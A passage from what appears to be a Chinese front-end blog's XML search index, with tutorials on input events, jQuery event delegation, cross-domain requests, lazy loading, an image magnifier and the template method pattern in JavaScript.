    <content type="text"><![CDATA[&emsp;&emsp;实时监听文本框值变化是非常常见的功能，通常最简单的办法就是用keyup,keydown来实现，但是这种方法有两个问题，一个是当直接复制粘贴的时候没法监听到事件，另外一个问题是在移动端，使用删除键删除输入时候也无法监听到！解决办法：1、使用onchange事件onchange事件是文本框内容改变并失去焦点的时候才触发。2、比较完美的解决办法：oninput和onproper&emsp;&emsp;oninput 是 HTML5 的标准事件，对于检测 textarea, input:text, input:password 和 input:search 这几个元素通过用户界面发生的内容变化非常有用，在内容修改后立即被触发，不像 onchange 事件需要失去焦点才触发。oninput 事件在主流浏览器的兼容情况如下：&emsp;&emsp;从上面表格可以看出，oninput 事件在 IE9 以下版本不支持，需要使用 IE 特有的 onpropertychange 事件替代，这个事件在用户界面改变或者使用脚本直接修改内容两种情况下都会触发，有以下几种情况：1、修改了 input:checkbox 或者 input:radio 元素的选择中状态， checked 属性发生变化。2、修改了 input:text 或者 textarea 元素的值，value 属性发生变化。3、修改了 select 元素的选中项，selectedIndex 属性发生变化。在监听到 onpropertychange 事件后，可以使用 event 的 propertyName 属性来获取发生变化的属性名称。集合 oninput &amp; onpropertychange 监听输入框内容变化的示例代码如下：123456789101112131415161718&lt;head&gt;&lt;script type="text/javascript"&gt;// Firefox, Google Chrome, Opera, Safari, Internet Explorer from version 9function OnInput (event) &#123;alert ("The new content: " + event.target.value);&#125;// Internet Explorerfunction OnPropChanged (event) &#123;if (event.propertyName.toLowerCase () == "value") &#123;alert ("The new content: " + event.srcElement.value);&#125;&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;Please modify the contents of the text field.&lt;input type="text" oninput="OnInput (event)" onpropertychange="OnPropChanged (event)" value="Text field" /&gt;&lt;/body&gt;123$('textarea').bind('input propertychange', function() &#123; $('.msg').html($(this).val().length + ' characters');&#125;);]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>实时监听输入框的值</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery1.9+中删除了live以后的替代方法]]></title>
    <url>%2F2015%2F10%2F28%2Fjquery1-9%E4%B8%AD%E5%88%A0%E9%99%A4%E4%BA%86live%E4%BB%A5%E5%90%8E%E7%9A%84%E6%9B%BF%E4%BB%A3%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[根据jQuery的官方描述，live方法在1.7中已经不建议使用，在1.9中删除了这个方法。并建议在以后的代码中使用on方法来替代。on方法可以接受三个参数：事件名、触发选择器、事件函数。需要特别注意的是：on方法中间的这个触发选择器就是你将要添加的HTML元素的类名、id或者元素名，使用它就可以实现live的效果。例如我的html文档中已经有了一个id为parent的div，我将要在这个div内部再动态添加一个class为son的span，然后我为这个span绑定一个事件，那么我需要这样写：1$('#parent').on('click','.son',function()&#123;alert('test')&#125;);&nbsp;这个触发选择器实际上就是在 JQ内部判断了一次事件参数的$(e.target).is(selector)，只有触发对象匹配触发选择器才会触发。这是利用了事件冒泡的机制来完成 的，原本的live也是使用冒泡机制所以既然on可以实现那么live也就没有存在的必要了，只不过为了兼容让它从1.7苟延残喘的活到了1.9而已。这篇文章也没啥内容了，接下来就用这个功能做点有意义的事情示范下吧～ 在低版本IE中A标签在鼠标按下时候会出现虚线边框，这是由focus造成的。我们只要在全局事件中做点手脚就能解决这个问题。在现代浏览器中focus 是不冒泡的，但是低版本浏览器中可以冒泡。所以对于低版本浏览器中对focus使用live是有效的。在jQuery1.9之前的版本我们可以这样写：123$("a").live("focus",function()&#123; this.blur();&#125;);&nbsp;jQuery1.9之后由于live被删除了，所以应该这样写：123$(document).on("focus","a",function()&#123; this.blur();&#125;);&nbsp;还要注意个问题，如果是从live的写法换成on的写法别忘了调整调用链。因为live的返回值是事件触发的对象，而使用on则是在容器对象上。123456789//jQuery1.9-$("#panel").find("div").live("click",function()&#123; alert("x");&#125;).addClass("x");//jQuery1.9+$("#panel").on("click","div",function()&#123; alert("x");&#125;).find("div").addClass("x");&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>jQuery删除了live以后的替代方法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js实现跨域的方法总结]]></title>
    <url>%2F2015%2F10%2F27%2Fjs%E5%AE%9E%E7%8E%B0%E8%B7%A8%E5%9F%9F%E7%9A%84%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[由于同源策略的限制，XMLHttpRequest只允许请求当前源（包含域名、协议、端口）的资源。json与jsonp的区别：JSON是一种数据交换格式，而JSONP是一种依靠开发人员创造出的一种非官方跨域数据交互协议。script标签经常被用来加载不同域下的资源，可以绕过同源策略。（有src属性的都可以获取异域文件）。如果请求的这个远程数据本身就是一段可执行的js，那么这些js会被执行（相当于eval）。&nbsp;方法一：利用script标签请求（&lt;script src=&quot;http://....jsp?callback=回调函数名&quot;&gt;&lt;/script&gt;）在使用script标签请求前，先进行回调函数的申明调用，1234&lt;script&gt;function 回调函数名（data数据）&#123; 。。。。 &#125;&lt;/script&gt;&lt;script src="http://....jsp?callback=回调函数名"&gt;&lt;/script&gt;使用JSON来传递javascript对象是一种最简单的方式了，这样的跨域通讯方式称为JSONP。远程服务器拼凑字符串：回调函数名( {“name1”:”data1”,”name2”,”data2”} )这种以后台拼凑json数据，利用回调函数传参的形式返回给客户端（可以直接调用相当于已经将获取的字符串进行eval了处理）例如：123function databack(data)&#123; alert(data.name1) &#125;// 会输出显示"data1"&nbsp;方法二：jquery实现异域加载方法更为简单(与ajax异步请求方式相同）12345$.ajax(&#123;type : "get",dataType:"json",success : function(data)&#123; alert(data.name1) &#125;;&#125;)或者简写形式12var url = "http://.....jsp?callback=?"; // 在jquery中此处的callback值可以为任意，因为jquery进行处理后都是利用success回调函数进行数据的接受；$.getJSON( url, function(data)&#123; alert(data.name1) &#125;);&nbsp;方法三：ajax跨域之服务端代理在同源的后台设置一个代理程序（proxy.jsp…）;在服务器端与异域的服务器交互。jquery前台传输数据：例如：12345678910$.get('http://。。。.jsp', // 代理程序地址&#123;name1 : "data1",name2 : "data2"&#125;,function(data)&#123;if(data == 1) alert('发送成功！');&#125;);后台数据的处理 :123456String data1 = request.getParameter("name1");........// 此处的url为另一域下的地址并带有参数String url = "http://.....com/.../sss.jsp?" + "name1=" + data1+ "name2=" +data2;// 跳转到另一个域进行数据的处理并返回json格式的数据request.getRequestDispatcher(url).forward(request,response);&nbsp;方法四：利用iframe标签的src属性，进行跨域的访问，将获取到的值存储到当前的iframe中，然后再同一页面进行获取该iframe的body内的值。12345678910&lt;body&gt;&lt;div id="show"&gt;&lt;/div&gt;&lt;iframe id="frame" style="display: none;"&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;script&gt;$("#frame").attr("src", "路径?time=" + new Date().getTime()).load(function()&#123;// 获取iframe标签的值并进行获取，显示到页面$("#show").append("[data: " + $($("#frame").get(0).contentDocument).find("body").text()+ " ]");&#125;);&lt;/script&gt;&nbsp;方法五：HTML5中websocket可以进行跨域的访问;创建一个websocket对象：var ws = new WebSocket(url);主要处理的事件类型有（onopen,onclose,onmessage,onerror）;例如：12345ws.onopen = function()&#123;console.log("open")；// 向后台发送数据ws.send("open");&#125;后台可以是java,php,nodejs等，对数据处理用时间onmessage事件对返回的值进行前端处理。123ws.onmessage = function(eve)&#123;console.log(eve.data);&#125;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js实现跨域的方法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[模块、图片、背景图片、视频等响应式（宽高等比缩放）布局]]></title>
    <url>%2F2015%2F10%2F26%2F%E6%A8%A1%E5%9D%97%E3%80%81%E5%9B%BE%E7%89%87%E3%80%81%E8%83%8C%E6%99%AF%E5%9B%BE%E7%89%87%E3%80%81%E8%A7%86%E9%A2%91%E7%AD%89%E5%93%8D%E5%BA%94%E5%BC%8F%EF%BC%88%E5%AE%BD%E9%AB%98%E7%AD%89%E6%AF%94%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;网页布局里很多地方需要宽高等比缩放功能，例如手机网页的全屏轮播。轮播的宽度随着手机不同分辨率而变化，高度自适应，这样才不会让轮播里面的图片压缩变形，顶多就是放太大而变模糊。&emsp;&emsp;之前同事的办法，是用一个透明的图片占位符，此图片的大小是需要的比例。例如2：1就把占位符做成2px1px，例如5：3就把占位符做成5px3px。然后放入img标签里，设置宽度100%，这样高度就自动撑开，进而撑开外层父div。img平级放个子div，相对父div绝对定位，宽高100%，这样子div的大小就和img一样大，实现等比缩放了。见→DEMO1←方法1（建议缩小窗口查看效果）。&emsp;&emsp;但这个方法有个最大弊端，img标签的大小，得里面的图片占位符解析出来，才可以撑开父div。这就导致网页一打开时，父div高度为0，等到图片占位符解析完毕后，父div才得以撑开，所以网页会闪动，体验不好，也会影响js的计算模块高度等问题。&emsp;&emsp;下面是群友提供的另外一种办法，利用padding取值百分比来做：垂直方向的padding取值使用百分比时，其值是相对于本模块的宽度（怪异模式盒子模型），而W3C的解释是：基于父对象总高度或宽度的百分比。大家看哪种好理解就理解哪个吧。提供一个→DEMO2←大家看看这个有趣的现象（建议缩小窗口查看效果）。&emsp;&emsp;根据padding的这个有趣现象，可以用伪类来撑开外层容器，轻松实现等比缩放模块、图片、背景图片、视频等，见→DEMO3←方法2（建议缩小窗口查看效果）。参考资料：http://www.topcss.org/?p=526录gif图片工具：http://www.cockos.com/licecap/]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>图片响应式（宽高等比缩放）布局</tag>
        <tag>模块响应式（宽高等比缩放）布局</tag>
        <tag>背景图片响应式（宽高等比缩放）布局</tag>
        <tag>视频响应式（宽高等比缩放）布局</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动端下拉刷新、加载更多插件dropload.js(基于jQuery/Zepto)]]></title>
    <url>%2F2015%2F10%2F26%2F%E7%A7%BB%E5%8A%A8%E7%AB%AF%E4%B8%8B%E6%8B%89%E5%88%B7%E6%96%B0%E3%80%81%E5%8A%A0%E8%BD%BD%E6%9B%B4%E5%A4%9A%E6%8F%92%E4%BB%B6dropload-js%E5%9F%BA%E4%BA%8Ejqueryzepto%2F</url>
    <content type="text"><![CDATA[废话不多说，先让大家看一下案例效果：DEMO1，加载底部&nbsp;DEMO2，加载顶部、底部&nbsp;DEMO3，固定布局，加载顶部、底部&nbsp;使用方法引用css和js12&lt;link rel="stylesheet" href="../dist/dropload.min.css"&gt;&lt;script src="../dist/dropload.min.js"&gt;&lt;/script&gt;$(‘.element’).dropload({scrollArea : window,loadDownFn : function(me){$.ajax({type: ‘GET’,url: ‘json/more.json’,dataType: ‘json’,success: function(data){alert(data);// 代码执行后必须重置me.resetload();},error: function(xhr, type){alert(‘Ajax error!’);me.resetload();}});}});```参数列表参数说明默认值可填值scrollArea滑动区域绑定元素自身windowdomUp上方DOM{domClass : ‘dropload-up’,domRefresh : ‘↓下拉刷新‘,domUpdate : ‘↑释放更新‘,domLoad : ‘○加载中…‘}数组domDown下方DOM{domClass : ‘dropload-down’,domRefresh : ‘↑上拉加载更多‘,domUpdate : ‘↓释放加载‘,domLoad : ‘○加载中…‘}数组distance拉动距离50数字loadUpFn上方function空function(me){//你的代码me.resetload();}loadDownFn下方function空function(me){//你的代码me.resetload();}API暴露一些功能，可以让dropload更灵活的使用lock() 锁定droploadunlock() 解锁dropload&nbsp;本站下载地址：点击下载&nbsp;]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>dropload.js</tag>
        <tag>移动端下拉刷新</tag>
        <tag>移动端加载更多</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js判断页面是否加载完成]]></title>
    <url>%2F2015%2F10%2F26%2Fjs%E5%88%A4%E6%96%AD%E9%A1%B5%E9%9D%A2%E6%98%AF%E5%90%A6%E5%8A%A0%E8%BD%BD%E5%AE%8C%E6%88%90%2F</url>
    <content type="text"><![CDATA[javascript代码如下：1234567document.onreadystatechange = subSomething; //当页面加载状态改变的时候执行这个方法function subSomething()&#123; if(document.readyState == “complete”) //判断页面加载状态 myform.submit();&#125;解析如下：Document.readyState属性描述了文档的加载状况，一个文档的readyState可能是以下的其中一个：loading文档仍然在加载interactive文档已经加载完毕而且已经被解析，但是一些子资源，例如图像，样式表和框架还在加载。这个状态表明DOMContentLoaded事件已经被触发。complete文档和全部的子资源已经加载完毕。这个状态表明load事件已经被触发。当readyState属性值改变的时候，document对象的readystatechange事件被触发。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js判断页面是否加载完成</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[页面中图片细节放大展示代码详解]]></title>
    <url>%2F2015%2F10%2F24%2F%E9%A1%B5%E9%9D%A2%E4%B8%AD%E5%9B%BE%E7%89%87%E7%BB%86%E8%8A%82%E6%94%BE%E5%A4%A7%E5%B1%95%E7%A4%BA%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;在很多的电商商品展示网页中，都会出现放大产品细节的功能，这里就根据主要原理，简单用css和js实现这个效果：实现原理：1、选择两张内容相同，大小不一致的图片，一个是要待选择细节的小图片，另一张是用来展示细节的大图片。2、要出现“选择小图片哪个细节”就展示出“大图片相同部分的细节内容”，这里就牵扯到比例的问题，即小图片中， 鼠标选择出的细节大小与整个小图片的长宽比例，要和大图片展示出的区域与大图片的长宽比例一致，这样效果才会逼真，如下图：根据比例相等我们可以得到公式：h1/h2 = h3/h4 ; w1/w2 = w3/w4&emsp;&emsp;由于图片的长宽在选择的时候就已经固定好了，要改变的就是小图片上的那块悬浮层大小根据比例做出相应的改变。3、当鼠标在小图片上移动的时候，根据比例大图片在显示区域移动，这样才会出现效果。HTML代码：1234567891011121314151617181920212223&lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;meta charset="UTF-8"&gt;&lt;meta name="Generator" content="EditPlus®"&gt;&lt;meta name="Author" content=""&gt;&lt;meta name="Keywords" content=""&gt;&lt;meta name="Description" content=""&gt;&lt;title&gt;自定义图片放大器&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="show_bigger_pic"&gt;&lt;span class="cover"&gt;&lt;/span&gt;&lt;span class="float_span"&gt;&lt;/span&gt;&lt;div class="small_pic_div"&gt;&lt;img src="img/small.bmp" alt="" /&gt;&lt;/div&gt;&lt;div class="big_pic_div"&gt;&lt;img src="img/big.bmp" alt="" /&gt;&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;CSS代码：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849*&#123;margin:0;padding:0;&#125; #show_bigger_pic&#123; position:absolute; width:800px; height:400px; top:200px; left:200px; &#125; .small_pic_div&#123; width:273px; height:177px; border:1px solid; float:left; position:relative;/* cover:absolute定位使用*/ &#125; .big_pic_div&#123; width:273px; height:177px; border:1px solid; float:left; margin-left:10px; display:none; overflow:hidden; &#125; .big_pic_div&gt;img&#123; position:relative; &#125; .cover&#123; width:273px; height:177px; position:absolute; border:1px solid; z-index:2; left:0; top:0; &#125; .float_span&#123; width:80px; height:80px; position:absolute; z-index:1; background:#B2DFEE; opacity:0.5; display:none; border:1px solid; left:0; top:0; &#125;Javascript代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172function gbc(tparent,tclass)&#123;//获取指定父元素的指定类的子元素的函数 var allclass=tparent.getElementsByTagName('*'); var result=[]; for (var i=0;i&lt;allclass.length;i++) &#123; if(allclass[i].className==tclass) result.push(allclass[i]); &#125; return result;//返回的是数组 &#125; window.onload =function ()&#123; var sbp=document.getElementById('show_bigger_pic');//获取最外层div var c=gbc(sbp,'cover')[0];//获取cover层 var fs=gbc(sbp,'float_span')[0];//获取浮动层 var spd=gbc(sbp,'small_pic_div')[0];//获取小图div var sp=spd.getElementsByTagName('img')[0];//获取小图 var bpd=gbc(sbp,'big_pic_div')[0];//获取大图div var bp=bpd.getElementsByTagName('img')[0];//获取大图 var btn=true;//开关，因参数只需获取一次 c.onmouseover =function()&#123;//鼠标移入小图 fs.style.display="block"; bpd.style.display="block"; c.style.cursor="pointer"; if(btn)&#123; //按照比例要得到浮动层的大小 //大小图像的长之比 var cb = sp.offsetHeight/bp.offsetHeight; var fsw = Math.ceil(cb * bpd.offsetHeight);//比例计算 fs.style.height = fsw+"px"; //alert(fs.offsetHeight+" "+Math.ceil(cb * bpd.offsetHeight)); var kb = sp.offsetWidth/bp.offsetWidth; var fsh = Math.ceil(cb * bpd.offsetWidth); fs.style.width = fsh+"px"; btn = false; &#125;; &#125;; c.onmouseout =function()&#123;//鼠标移出 fs.style.display="none"; bpd.style.display="none"; &#125;; c.onmousemove =function (ev)&#123;//鼠标移动 //保存高比例 var hb = sp.offsetHeight/fs.offsetHeight; //保存宽比例 var wb = sp.offsetWidth/fs.offsetWidth; var pos=ev||event; var left=pos.clientX-sbp.offsetLeft-fs.offsetWidth/2;//计算left var top=pos.clientY-sbp.offsetTop-fs.offsetHeight/2;//计算top if(left&lt;0)&#123; left=0;//当小于0强制固定 &#125; else if(left&gt;spd.offsetWidth-fs.offsetWidth)&#123;//大于某一参数也固定，以防浮动层移出图片区 left=c.offsetWidth-fs.offsetWidth; &#125; if(top&lt;0)&#123; top=0; &#125; else if(top&gt;spd.offsetHeight-fs.offsetHeight)&#123; top=c.offsetHeight-fs.offsetHeight; &#125; fs.style.left=left+"px";//浮动层位置改变 fs.style.top=top+'px'; bp.style.left=-wb*left+"px";//右边大图位置的改变，表现在实际中是放大区改变 bp.style.top=-hb*top+"px"; &#125;; &#125;效果图：]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js页面中图片细节放大展示</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Chrome二维码生成插件]]></title>
    <url>%2F2015%2F10%2F23%2Fchrome%E4%BA%8C%E7%BB%B4%E7%A0%81%E7%94%9F%E6%88%90%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[给移动端开发的小伙伴们带来福利了啦，还记得你每次开发的移动端页面先要拷贝网站去使用工具生成二维码么？还记得你使用的二维码工具，使用三次后需要人民币才可以继续使用？还记得你要装chrome商店的二维码生成插件，要去翻墙下载么？好了，不去提及大家这些伤心事了，本阁主今天就直接奉上第三方的chrome二维码插件，安全可靠纯洁。插件没有在 chrome 应用中心注册，所以会有警告，下载下来直接往 chrome://extensions 里面拖，安装就行了下载地址：https://coding.net/u/yuanoook/p/Pure-Qrcode/git/raw/master/PureQrcode.crx源码：https://coding.net/u/yuanoook/p/Pure-Qrcode/githttps://github.com/yuanoook/Pure-Qrcode最终效果：开发参考：官方文档：https://developer.chrome.com/extensions360的文档：http://open.chrome.360.cn/extension_dev/overview.htmlQrcode 库：http://jeromeetienne.github.com/jquery-qrcode]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>Chrome二维码生成插件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery延迟加载图片插件(懒加载插件 LazyLoad)]]></title>
    <url>%2F2015%2F10%2F22%2Fjquery%E5%BB%B6%E8%BF%9F%E5%8A%A0%E8%BD%BD%E5%9B%BE%E7%89%87%E6%8F%92%E4%BB%B6%E6%87%92%E5%8A%A0%E8%BD%BD%E6%8F%92%E4%BB%B6-lazyload%2F</url>
    <content type="text"><![CDATA[Lazy Load 是一个用 JavaScript 编写的 jQuery 插件.它可以延迟加载长页面中的图片. 在浏览器可视区域外的图片不会被载入, 直到用户将页面滚动到它们所在的位置. 这与图片预加载的处理方式正好是相反的。在包含很多大图片长页面中延迟加载图片可以加快页面加载速度. 浏览器将会在加载可见图片之后即进入就绪状态. 在某些情况下还可以帮助降低服务器负担。使用方法：Lazy Load 依赖于 jQuery. 请将下列代码加入页面 head 区域:12&lt;script src="jquery.js" type="text/javascript"&gt;&lt;/script&gt;&lt;script src="jquery.lazyload.js" type="text/javascript"&gt;&lt;/script&gt;你必须修改 HTML 代码. 在 src 属性中设置展位符图片, demo 页面使用 1x1 像素灰色 GIF 图片. 并且需要将真实图片的 URL 设置到 data-original 属性. 这里可以定义特定的 class 以获得需要延迟加载的图片对象.通过这种方法你可以简单地控制插件绑定。1&lt;img class="lazy" src="img/grey.gif" data-original="img/example.jpg" width="640" heigh="480"&gt;处理图片的代码如下:1$("img.lazy").lazyload();这将使所有 class 为 lazy 的图片将被延迟加载。&nbsp;设置敏感度几乎所有浏览器的 JavaScript 都是激活的. 然而可能你仍希望能在不支持 JavaScript 的客户端展示真实图片. 当浏览器不支持 JavaScript 时优雅降级, 你可以将真实的图片片段在写&lt;noscript&gt;标签内。12&lt;img class="lazy" src="img/grey.gif" data-original="img/example.jpg" width="640" heigh="480"&gt;&lt;noscript&gt;&lt;img src="img/example.jpg" width="640" heigh="480"&gt;&lt;/noscript&gt;可以通过 CSS 隐藏占位符：123.lazy &#123; display: none;&#125;在支持 JavaScript 的浏览器中, 你必须在 DOM ready 时将占位符显示出来, 这可以在插件初始化的同时完成。1$("img.lazy").show().lazyload();这些都是可选的, 但如果你希望插件平稳降级这些都是应该做的。&nbsp;设置延时度默认情况下图片会出现在屏幕时加载. 如果你想提前加载图片, 可以设置 threshold 选项, 设置 threshold 为 200 令图片在距离屏幕 200 像素时提前加载。threshold : 200 &#125;);```12345678910111213141516&amp;nbsp;#### 占位图片你还可以设定一个占位图片并定义事件来触发加载动作. 这时需要为占位图片设定一个 URL 地址. 透明, 灰色和白色的 1x1 象素的图片已经包含在插件里面。&amp;nbsp;#### 事件触发加载事件可以是任何 jQuery 时间, 如: click 和 mouseover. 你还可以使用自定义的事件, 如: sporty 和 foobar. 默认情况下处于等待状态, 直到用户滚动到窗口上图片所在位置. 在灰色占位图片被点击之前阻止加载图片, 你可以这样做:```javascript$(&quot;img&quot;).lazyload(&#123; placeholder : &quot;img/grey.gif&quot;, event : &quot;click&quot;&#125;);&nbsp;使用特效当图片完全加载的时候, 插件默认地使用 show() 方法来将图显示出来. 其实你可以使用任何你想用的特效来处理. 下面的代码使用 FadeIn 效果. 这是效果演示页面。12 effect : &quot;fadeIn&quot;&#125;);&nbsp;图片在容器里面你可以将插件用在可滚动容器的图片上, 例如带滚动条的 DIV 元素. 你要做的只是将容器定义为 jQuery 对象并作为参数传到初始化方法里面。1234567#container &#123; height: 600px; overflow: scroll;&#125;$("img.lazy").lazyload(&#123; container: $("#container")&#125;);&nbsp;当图片不顺序排列滚动页面的时候, Lazy Load 会循环为加载的图片.在循环中检测图片是否在可视区域内.默认情况下在找到第一张不在可见区域的图片时停止循环. 图片被认为是流式分布的, 图片在页面中的次序和 HTML代码中次序相同. 但是在一些布局中, 这样的假设是不成立的. 不过你可以通过 failurelimit 选项来控制加载行为。123$("img.lazy").lazyload(&#123; failure_limit : 10&#125;);将 failurelimit 设为 10 令插件找到 10 个不在可见区域的图片是才停止搜索. 如果你有一个猥琐的布局, 请把这个参数设高一点。&nbsp;延迟加载图片Lazy Load 插件的一个不完整的功能, 但是这也能用来实现图片的延迟加载.下面的代码实现了页面加载完成后再加载. 页面加载完成 5 秒后, 指定区域内的图片会自动进行加载.这是延迟加载演示页面。12345678$(function() &#123; $("img:below-the-fold").lazyload(&#123; event : "sporty" &#125;);&#125;);$(window).bind("load", function() &#123; var timeout = setTimeout(function() &#123;$("img.lazy").trigger("sporty")&#125;, 5000);&#125;);&nbsp;加载隐藏的图片可能在你的页面上埋藏可很多隐藏的图片. 比如插件用在对列表的筛选, 你可以不断地修改列表中各条目的显示状态. 为了提升性能, Lazy Load 默认忽略了隐藏图片. 如果你想要加载隐藏图片, 请将 skip_invisible 设为 false123$("img.lazy").lazyload(&#123; skip_invisible : false&#125;);&nbsp;参数应用设置1234567891011121314$("img.lazy").lazyload(&#123; placeholder : "img/grey.gif", //用图片提前占位 // placeholder,值为某一图片路径.此图片用来占据将要加载的图片的位置,待图片加载时,占位图则会隐藏 effect: "fadeIn", // 载入使用何种效果 // effect(特效),值有show(直接显示),fadeIn(淡入),slideDown(下拉)等,常用fadeIn threshold: 200, // 提前开始加载 // threshold,值为数字,代表页面高度.如设置为200,表示滚动条在离目标位置还有200的高度时就开始加载图片,可以做到不让用户察觉 event: 'click', // 事件触发时才加载 // event,值有click(点击),mouseover(鼠标划过),sporty(运动的),foobar(…).可以实现鼠标莫过或点击图片才开始加载,后两个值未测试… container: $("#container"), // 对某容器中的图片实现效果 // container,值为某容器.lazyload默认在拉动浏览器滚动条时生效,这个参数可以让你在拉动某DIV的滚动条时依次加载其中的图片 failurelimit : 10 // 图片排序混乱时 // failurelimit,值为数字.lazyload默认在找到第一张不在可见区域里的图片时则不再继续加载,但当HTML容器混乱的时候可能出现可见区域内图片并没加载出来的情况,failurelimit意在加载N张可见区域外的图片,以避免出现这个问题.&#125;);下载lazyload]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>jq LazyLoad</tag>
        <tag>LazyLoad.js</tag>
        <tag>延迟加载图片插件</tag>
        <tag>懒加载插件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javascript中模板方法模式]]></title>
    <url>%2F2015%2F10%2F20%2Fjavascript%E4%B8%AD%E6%A8%A1%E6%9D%BF%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[在JavaScript开发中用到集成的场景其实并不是很多，衡多时候我们都喜欢用mix-in(混入)的方式给对象扩展属性。但这不代表继承在JavaScript里没有用武之地，虽然没有真正的类和继承机制，但我们可以通过原型prototype来变相地实现继承。不过本章并非要讨论继承，而是讨论一种基于继承的设计模式——模板方法（Template Method）模式。1. 模板方法模式的定义和组成模板方法模式是一种只需要使用继承就可以实现的非常简单的模式。模板方法模式由两部分结构组成，第一部分是抽象父类，第二部分是具体的实现子类。通常在抽象父类中封装了子类的算法框架，包括实现一些公共方法以及封装子类中所有方法的执行顺序。子类通过继承这个抽象类，也继承了整个算法结构，并且可以选择重写父类的方法。假如我们有一些平行的子类，各个子类之间有一些相同的行为，也有一些不同的行为。如果相同和不同的行为都混合在各个子类的实现中，说明这些相同的行为会在各个子类中重复出现。但实际上，相同的行为可以被搬移到另外一个单一的地方，模板方法模式就是为解决这个问题而生的。在模板方法模式中，子类实现中的相同部分被上移到父类中，而将不同的部分留待子类来实现。这也很好地体现了泛化的思想。2. 第一个例子——Coffee or Tea咖啡与茶是一个经典的例子，经常用来讲解模板方法模式，这个例子的原型来自《Head First 设计模式》。这一节我们就用JavaScript来实现这个例子。2. 1 先泡一杯咖啡首先，我们先来泡一杯咖啡，如果没有什么太个性化的需求，泡咖啡的步骤通常如下：1、把水煮沸2、用沸水冲泡咖啡3、把咖啡倒进杯子4、加糖和牛奶通过下面这段代码，我们就能得到一杯香浓的咖啡：12345678910111213141516171819202122232425var Coffee = function()&#123;&#125;;Coffee.prototype.boilWater = function()&#123;console.log('把水煮沸');&#125;;Coffee.prototype.brewCoffeeGriends = function()&#123;console.log('用沸水冲泡咖啡');&#125;;Coffee.prototype.pourInCup = function()&#123;console.log('把咖啡倒进杯子');&#125;;Coffee.prototype.addSugarAndMilk = function()&#123;console.log('加糖和牛奶');&#125;;Coffee.prototype.init = function()&#123;this.boilWater();this.brewCoffeeGriends();this.pourInCup();this.addSugarAndMilk();&#125;;var coffee = new Coffee();coffee.init();2. 2 泡一壶茶接下来，开始准备我们的茶，泡茶的步骤跟泡咖啡的步骤相差不大：1、把水煮沸2、用沸水㓎泡茶叶3、把茶叶倒进杯子4、加柠檬同样用一段代码来实现泡茶的步骤：123456789101112131415161718192021222324var Tea = function()&#123;&#125;;Tea.prototype.boilWater = function()&#123;console.log('把水煮沸');&#125;;Tea.prototype.steepTeaBag = function()&#123;console.log('用沸水㓎泡茶叶');&#125;;Tea.prototype.pourInCup = function()&#123;console.log('把茶水倒进杯子');&#125;;Tea.prototype.addLemon = function()&#123;console.log('加柠檬');&#125;;Tea.prototype.init = function()&#123;this.boilWater();this.steepTeaBag();this.pourInCup();this.addLemon();&#125;;var tea = new Tea();tea.init();2. 3 分离出共同点现在我们分别泡好了一杯咖啡和一壶茶，经过思考和比较，我们发现咖啡和茶的冲泡过程是大同小异的。泡咖啡和泡茶主要有以下不同点。原料不同。一个是咖啡，一个是茶，但我们可以把它们都抽象为“饮料”。泡的方式不同。咖啡是冲泡，而茶叶是㓎泡，我们可以把它们都抽象为“泡”。加入的调料不同。一个是糖和牛奶，一个是柠檬，但我们可以把它们都抽象为“调料”。经过抽象之后，不管是泡咖啡还是泡茶，我们都能整理为下面四步：1、把水煮沸2、用沸水冲泡饮料3、把饮料倒进杯子4、加调料所以，不管是冲泡还是㓎泡，我们都能给它一个新的方法名称，比如说brew()。同理，不管是加糖和牛奶，还是柠檬，我们都可以称之为addCondiments()。让我们忘记最开始创建的Coffee类和Tea类。现在可以创建一个抽象父类来表示泡一杯饮料的整个过程。不论是Coffee，还是Tea，都被我们用Beverage来表示，代码如下：1234567891011121314var Bevarage = function();Bevarage.prototype.boilWater = function()&#123;console.log('把水煮沸');&#125;;Bevarage.prototype.brew = function()&#123;&#125;; //空方法，应该由子类重写Bevarage.prototype.pourInCup = function()&#123;&#125;; //空方法，应该由子类重写Bevarage.prototype.addCondiments = function()&#123;&#125;; //空方法，应该由子类重写Bevarage.prototype.init = function()&#123;this.boilWater();this.brew();this.pourInCup();this.addCondiments();&#125;;2. 4 创建Coffee子类和Tea子类现在创建一个Beverage类的对象对我们来说没有意义，因为世界上能喝的东西没有一种真正叫“饮料”的，饮料在这里还只是一个抽象的存在。接下来我们要创建咖啡类和茶类，并让它们继承饮料类：var Coffee = function(){};Coffee.prototype = new 